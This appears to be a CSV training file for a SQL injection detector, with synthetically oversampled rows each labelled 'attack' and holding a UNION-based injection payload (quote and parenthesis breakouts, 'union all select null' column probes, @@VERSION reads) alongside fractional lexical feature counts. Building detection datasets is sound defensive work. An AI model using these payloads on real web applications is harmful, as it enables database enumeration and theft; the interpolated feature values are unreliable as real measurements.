id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000682,0.3728264511413045,76.96812445405189,17.0,3.20172071191642,44.374499563241514,1.0,18.0,13.593624890810379,0.5757805245511088,0.013036016014470408,0.23464828826046752,0.17653517117395326,1.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,6.5936248908103785,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000809,0.49632221814986216,110.88869073026063,29.622261853947872,4.157530422178168,37.0,41.51095258420851,17.0,15.377738146052128,0.334271123733161,0.3735784583728325,0.15358402982334424,0.1385663880706623,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.377738146052128,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000003,attack,union,"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",nearest_attack_euclidean,R000830,0.15491172549665455,84.77742235879491,22.0,3.714401151962577,14.0,39.02193788703593,18.0,13.755484471758983,0.165409438031957,0.4597291560485455,0.21266927746965905,0.1621921284498384,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.755484471758983,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,0.2695556977238584,61.57197859569695,20.31439571913939,3.6689603673071414,14.0,25.25758287655756,14.0,8.31439571913939,0.2276903332462161,0.4096737144350582,0.22769033324621607,0.13494561907250968,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.31439571913939,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R000691,0.12859815139041716,30.727033638252045,15.060586136521003,3.417670825631201,18.242344546084016,1.0,8.363516819126023,3.121172273042008,0.5953839134079235,0.03275632250932378,0.27070574243473355,0.10115402164801912,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0605861365210039,0.0,0.0,0.060586136521004086,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R001097,0.48296255910195773,37.76730803742922,21.353461607485844,4.205606715701032,14.0,13.413846429943371,4.0,6.353461607485842,0.3770713512793006,0.34751437846483935,0.10773467179408587,0.16767959846177424,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.3534616074858428,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000528,0.42681511070499706,93.15234372709504,24.63046874541901,3.8615173903367532,25.0,34.521874981676035,22.0,11.630468745419009,0.26943824410821415,0.3688988094268573,0.23710565481522847,0.12455729164970003,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.630468745419008,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R001070,0.8124978366283696,114.11340467517945,28.548453956690594,4.173338140269556,31.19381582676237,49.09690791338119,15.548453956690594,18.274226978345297,0.27251134584462955,0.4307793778955139,0.1362639174624199,0.16044535879743654,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.274226978345297,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.274226978345297
SMOTE_000009,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,0.2967614146968578,73.0,32.55036556932038,4.380136311339716,42.0,3.449634430679625,17.0,10.550365569320377,0.5753424657534246,0.047255266173693466,0.2328767123287671,0.14452555574411474,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000010,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,0.6908387986440993,71.25762716816989,28.257627168169886,4.210451015574893,34.48474566366023,12.45847471246719,15.0,9.314406792042472,0.4855984539061641,0.17312250682609542,0.2106439367717088,0.13063510249603166,3.0,0.0,0.3144067920424718,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,3.3144067920424716,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000011,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000583,0.15161602713470046,70.4369774488181,26.331610180496483,3.973498772287952,19.663220360992966,28.442146907328645,14.221073453664323,8.110536726832162,0.2786248910181992,0.404077901738913,0.20203895086945653,0.11525825637343132,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1105367268321613,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000580,1.1920928955078125e-07,40.0,20.0,4.087326145256009,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R000881,0.14035671825774026,50.18640498196628,18.837280996393257,3.6600493163485357,34.34912398557302,1.0,11.0,3.8372809963932566,0.6842630643202917,0.01995464408270828,0.21950108490979153,0.07628120668720842,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.837280996393257,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000478,0.05044430285569137,71.62033947517159,21.0,3.736462465918503,14.0,27.696271580137278,18.0,11.92406789503432,0.1955462784717242,0.38655929694549734,0.25141664374935974,0.1664777808334187,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.9240678950343195,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000707,0.2503262609520778,88.10765160063399,20.126156559957735,3.487213303044615,57.486121280507184,9.0,10.0,11.621530320126796,0.6519110327123321,0.10252313119915471,0.11391459022128299,0.1316512458672302,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,8.621530320126798,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,union,"1"" union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001639,0.018718564891156482,55.147005817663384,15.0,3.0973737709144933,42.11760465413071,1.0,4.0,8.029401163532677,0.7637186046532383,0.018140697673380918,0.07256279069352348,0.14557790697985737,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.029401163532677,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000419,0.23439756170272533,50.72096902413024,14.0,3.064856133734886,39.37677521930419,1.0,4.0,6.344193804826048,0.7762906888998322,0.019757759250139756,0.07903103700055897,0.12492051484946898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.344193804826048,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,1.088819544839729,83.2892264117546,26.54215471764908,3.845207554902729,42.0,3.4578452823509203,26.83138112940368,11.0,0.504716119825769,0.04137493376904405,0.32172139121272364,0.1321875551924633,0.0,0.0,2.0,0.0,1.0,1.4578452823509198,0.0,2.0,0.0,0.0,1.0,4.915690564701839,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000019,attack,union,"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001244,0.4144558757730345,105.7774404743287,25.666464284597218,3.7693212496250212,67.22195237946296,9.0,15.0,14.55548809486574,0.6354123934064473,0.08513152065183763,0.14188586775306272,0.13757021818865242,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.55548809486574,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
